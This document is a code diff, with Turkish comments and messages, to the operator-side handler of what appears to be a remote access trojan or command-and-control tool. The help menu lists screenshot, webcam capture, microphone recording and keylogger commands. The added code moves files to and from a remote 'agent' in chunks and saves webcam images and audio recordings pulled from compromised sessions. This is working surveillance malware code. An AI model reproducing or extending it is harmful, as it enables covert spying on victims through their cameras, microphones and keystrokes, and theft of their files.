@@ -383,7 +383,9 @@ class Handler(BaseHandler):
   download <remote>     - Dosya indir
 
 [Gözetleme]
-  screenshot            - Anlık ekran görüntüsü al (RAM üzerinden)
+  screenshot [q] [fmt]  - Ekran görüntüsü al (Örn: screenshot 80 jpeg)
+  webcam_snap           - Web kamerasından anlık görüntü al
+  audio_record [sn]     - Mikrofondan ses kaydı al (Örn: audio_record 10)
   keylogger_start       - Keylogger başlat (Windows)
   keylogger_stop        - Keylogger durdur
   keylogger_dump        - Tuş kayıtlarını getir ve kaydet
@@ -533,15 +535,98 @@ class Handler(BaseHandler):
                             print(f"[!] Dosya bulunamadı: {local_path}")
                             continue
                             
+                        file_size = os.path.getsize(local_path)
+                        chunk_size = 512 * 1024 # 512 KB
+                        print(f"[*] Dosya yükleniyor: {local_path} -> {remote_path} ({file_size} bytes)")
+                        
                         with open(local_path, "rb") as f:
-                            file_content = f.read()
-                            b64_content = base64.b64encode(file_content).decode('utf-8')
-                            
-                        print(f"[*] Dosya yükleniyor: {local_path} -> {remote_path} ({len(file_content)} bytes)")
-                        cmd = f"upload {remote_path} {b64_content}"
+                            offset = 0
+                            while offset < file_size or file_size == 0:
+                                chunk_data = f.read(chunk_size)
+                                if not chunk_data and file_size > 0:
+                                    break
+                                
+                                b64_content = base64.b64encode(chunk_data).decode('utf-8')
+                                upload_cmd = f"upload_chunk {remote_path} {offset} {b64_content}"
+                                self.send_data(upload_cmd)
+                                response = self.recv_data()
+                                
+                                if response and "[+]" in response:
+                                    offset += len(chunk_data)
+                                    if file_size > 0:
+                                        print(f"\r[*] İlerleme: {offset}/{file_size} bytes ({(offset/file_size)*100:.1f}%)", end="", flush=True)
+                                    if file_size == 0:
+                                        break # Empty file uploaded
+                                else:
+                                    print(f"\n[!] Yükleme hatası (offset {offset}): {response}")
+                                    break
+                        if offset >= file_size:
+                            print("\n[+] Dosya başarıyla yüklendi!")
+                        continue
                         
                     except Exception as e:
                         print(f"[!] Upload hazırlık hatası: {str(e)}")
+                        continue
+
+                # Dosya İndirme (Chunked)
+                if cmd_lower.startswith("download "):
+                    try:
+                        parts = cmd.split(" ", 2)
+                        if len(parts) < 2:
+                            print("[!] Kullanım: download <remote_path> [local_path]")
+                            continue
+                            
+                        remote_path = parts[1]
+                        local_path = parts[2] if len(parts) > 2 else os.path.basename(remote_path)
+                        
+                        self.send_data(f"file_size {remote_path}")
+                        resp = self.recv_data()
+                        
+                        if resp and resp.startswith("FILE_SIZE_OK:"):
+                            file_size = int(resp.split(":")[1])
+                            print(f"[*] Dosya indiriliyor: {remote_path} -> {local_path} ({file_size} bytes)")
+                            
+                            chunk_size = 512 * 1024 # 512KB
+                            offset = 0
+                            
+                            with open(local_path, "wb") as f:
+                                while offset < file_size or file_size == 0:
+                                    to_read = min(chunk_size, file_size - offset) if file_size > 0 else 0
+                                    self.send_data(f"download_chunk {remote_path} {offset} {to_read}")
+                                    chunk_resp = self.recv_data()
+                                    
+                                    if chunk_resp and chunk_resp.startswith("DOWNLOAD_CHUNK_OK:"):
+                                        b64_data = chunk_resp.split(":", 1)[1]
+                                        chunk_data = base64.b64decode(b64_data)
+                                        f.write(chunk_data)
+                                        offset += len(chunk_data)
+                                        if file_size > 0:
+                                            print(f"\r[*] İlerleme: {offset}/{file_size} bytes ({(offset/file_size)*100:.1f}%)", end="", flush=True)
+                                        if file_size == 0:
+                                            break
+                                    else:
+                                        print(f"\n[!] İndirme hatası (offset {offset}): {chunk_resp}")
+                                        break
+                                if offset >= file_size:
+                                    print("\n[+] Dosya başarıyla indirildi!")
+                        elif resp and resp.startswith("FILE_SIZE_ERROR:"):
+                            print(f"[!] Dosya boyutu alınamadı: {resp}")
+                        else:
+                            # Fallback if agent doesn't support file_size (Legacy download)
+                            print(f"[*] Chunked transfer desteklenmiyor, eski yöntem deneniyor...")
+                            self.send_data(cmd)
+                            response = self.recv_data()
+                            if response and response.startswith("DOWNLOAD_OK:"):
+                                b64_data = response.split(":", 1)[1]
+                                file_content = base64.b64decode(b64_data)
+                                with open(local_path, "wb") as f:
+                                    f.write(file_content)
+                                print(f"[+] Dosya başarıyla indirildi: {local_path} ({len(file_content)} bytes)")
+                            else:
+                                print(f"[!] İndirme hatası: {response}")
+                        continue
+                    except Exception as e:
+                        print(f"[!] Download hazırlık hatası: {str(e)}")
                         continue
 
                 # Port Forwarding işlemleri (Handler yakalar ve ajana gönderir)
@@ -657,6 +742,48 @@ class Handler(BaseHandler):
                             print(f"    Format: {ext.upper()}")
                         except Exception as e:
                             print(f"[!] Screenshot kaydetme hatası: {str(e)}")
+
+                    # Webcam Görüntüsü
+                    elif response.startswith("WEBCAM_OK:"):
+                        try:
+                            b64_data = response.split(":", 1)[1]
+                            img_data = base64.b64decode(b64_data)
+                            
+                            media_dir = os.path.join(os.getcwd(), "media")
+                            os.makedirs(media_dir, exist_ok=True)
+                            
+                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                            filename = f"webcam_{timestamp}_session{self.session_id}.jpeg"
+                            save_path = os.path.join(media_dir, filename)
+                            
+                            with open(save_path, "wb") as f:
+                                f.write(img_data)
+                                
+                            print(f"[+] 📷 Webcam görüntüsü kaydedildi!")
+                            print(f"    Dosya : {save_path}")
+                        except Exception as e:
+                            print(f"[!] Webcam kaydetme hatası: {str(e)}")
+
+                    # Ses Kaydı
+                    elif response.startswith("AUDIO_OK:"):
+                        try:
+                            b64_data = response.split(":", 1)[1]
+                            wav_data = base64.b64decode(b64_data)
+                            
+                            media_dir = os.path.join(os.getcwd(), "media")
+                            os.makedirs(media_dir, exist_ok=True)
+                            
+                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                            filename = f"audio_{timestamp}_session{self.session_id}.wav"
+                            save_path = os.path.join(media_dir, filename)
+                            
+                            with open(save_path, "wb") as f:
+                                f.write(wav_data)
+                                
+                            print(f"[+] 🎤 Ses kaydı kaydedildi!")
+                            print(f"    Dosya : {save_path}")
+                        except Exception as e:
+                            print(f"[!] Ses kaydetme hatası: {str(e)}")
 
                     # Keylogger Dökümü: Gelen logları kaydet
                     elif response.startswith("KEYLOG_DUMP:"):
